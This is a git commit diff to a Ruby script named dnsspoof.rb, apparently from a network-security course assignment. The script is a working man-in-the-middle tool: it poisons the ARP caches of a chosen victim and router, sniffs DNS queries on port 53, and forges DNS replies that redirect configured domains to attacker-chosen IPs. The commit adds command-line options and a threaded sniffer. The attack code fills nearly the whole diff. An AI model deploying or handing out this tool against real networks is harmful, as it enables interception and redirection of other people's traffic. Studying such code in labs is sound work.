eb53ee066ff078d45c1a5d2bc026a304cb63408f
zach <zach@smoroden.com>
2014-11-01 23:02:15 -0700

    fixed the merge

--- Assignment 3/dnsspoof.rb
+++ Assignment 3/dnsspoof.rb
@@ -3,43 +3,74 @@ require 'rubygems'
 require 'packetfu'
 require 'thread'
 require 'macaddr'
+require 'optparse'
+require_relative 'utils.rb'
 
-### User Defined ###############################
+include PacketFu
 
-target_ip = '192.168.0.9'
-router_ip = '192.168.0.100'
-$attacker_ip = '192.168.0.8'
-iface = 'em1'
+# Set up the rules for spoofing
+$spoof_hash = Hash.new
+config = File.open(CONFIG_FILE)
+if(config.nil?)
+  #config_error()
+  exit()
+end
+config.each_line do |line|
+  if(!line.nil? && line != "\n")
+    domain, ip = line.split(' ')
+    $spoof_hash[".*#{domain}"] = ip
+  end
 
-################################################
+end
 
+#parse command line arguments
+OptionParser.new do |opts|
+  opts.on("-h", "--help", "usage and program help") do
+    usage()
+    exit(1)
+  end
+  opts.on("-v n", "--victim", "victim's IP address") do |vctm|
+    $target_ip = vctm
+  end
+  opts.on("-r n", "--router", "router IP address") do |router|
+    $router_ip = router
+  end
+  opts.on("-i n", "--interface", "network interface") do |interface|
+    $iface = interface
+  end
+end.parse!
+
+#did they supply a victim and an address to spoof to?
+if $target_ip.nil?
+  abort("You must specify the victim's IP address and an IP address to spoof!")
+end
 # Get the mac addresses for all the necessary machines.
 sender_mac = Mac.addr
-`ping -c 1 #{target_ip}`
-target_mac = `arp | grep #{target_ip} | awk '{ print $3} '`
-router_mac = `arp | grep #{router_ip} | awk '{ print $3} '`
+`ping -c 1 #{$target_ip}`
+target_mac = `arp | grep #{$target_ip} | awk '{ print $3} '`
+router_mac = `arp | grep #{$router_ip} | awk '{ print $3} '`
 
 # Builds on the previous ARP spoofing example.
 # The sending of ARP packets is done in a separate thread.
 
 # Construct the target's packet
-arp_packet_target = PacketFu::ARPPacket.new()
+arp_packet_target = ARPPacket.new()
 arp_packet_target.eth_saddr = sender_mac       # sender's MAC address
 arp_packet_target.eth_daddr = target_mac       # target's MAC address
 arp_packet_target.arp_saddr_mac = sender_mac   # sender's MAC address
 arp_packet_target.arp_daddr_mac = target_mac   # target's MAC address
-arp_packet_target.arp_saddr_ip = router_ip        # router's IP
-arp_packet_target.arp_daddr_ip = target_ip         # target's IP
+arp_packet_target.arp_saddr_ip = $router_ip        # router's IP
+arp_packet_target.arp_daddr_ip = $target_ip         # target's IP
 arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply
 
 # Construct the router's packet
-arp_packet_router = PacketFu::ARPPacket.new()
+arp_packet_router = ARPPacket.new()
 arp_packet_router.eth_saddr = sender_mac       # sender's MAC address
 arp_packet_router.eth_daddr = router_mac       # router's MAC address
 arp_packet_router.arp_saddr_mac = sender_mac   # sender's MAC address
 arp_packet_router.arp_daddr_mac = router_mac   # router's MAC address
-arp_packet_router.arp_saddr_ip = target_ip         # target's IP
-arp_packet_router.arp_daddr_ip = router_ip        # router's IP
+arp_packet_router.arp_saddr_ip = $target_ip         # target's IP
+arp_packet_router.arp_daddr_ip = $router_ip        # router's IP
 arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
 
 # Enable IP forwarding
@@ -51,16 +82,24 @@ def runspoof(arp_packet_target,arp_packet_router)
   caught=false
   while caught==false do
     sleep 1
-    arp_packet_target.to_w(@interface)
-    arp_packet_router.to_w(@interface)
+    arp_packet_target.to_w($iface)
+    arp_packet_router.to_w($iface)
   end
 end
 
+def check_spoof(domainName)
+  $spoof_hash.each_key do |k|
+    if domainName =~ /#{k}/
+      return $spoof_hash[k]
+    end
+  end
+  return nil
+end
 
-def sendResponse(packet, domainName)
+def sendResponse(packet, domainName, spoof_ip)
 
   # Convert the IP address
-  myIP = $attacker_ip.split(".");
+  myIP = spoof_ip.split(".");
   myIP2 = [myIP[0].to_i, myIP[1].to_i, myIP[2].to_i, myIP[3].to_i].pack('c*')
 
   # Create the UDP packet
@@ -150,7 +189,7 @@ end
 
 # Opens up the nic for capture.
 def sniff(iface)
-  pp 'Sniffing...'
+  puts 'Sniffing...'
   cap = Capture.new(:iface => iface, :start => true, :filter => 'udp and port 53', :save => true)
   cap.stream.each do |p|
     packet = Packet.parse p
@@ -159,8 +198,11 @@ def sniff(iface)
 
     if $dnsQuery == '10'
       domain = get_info(packet)
+      spoof_ip = check_spoof(domain)
+      if !spoof_ip.nil?
+        sendResponse(packet, domain, spoof_ip)
+      end
 
-      sendResponse(packet, domain)
     end
 
   end
@@ -170,8 +212,11 @@ end
 begin
   puts "Starting the ARP poisoning thread..."
   spoof_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)}
+
+  puts "Starting the sniffing thread..."
+  sniff_thread = Thread.new{sniff($iface)}
   spoof_thread.join
-  sniff(iface)
+  sniff_thread.join
     # Catch the interrupt and kill the thread
 rescue Interrupt
   puts "\nARP spoof stopped by interrupt signal."
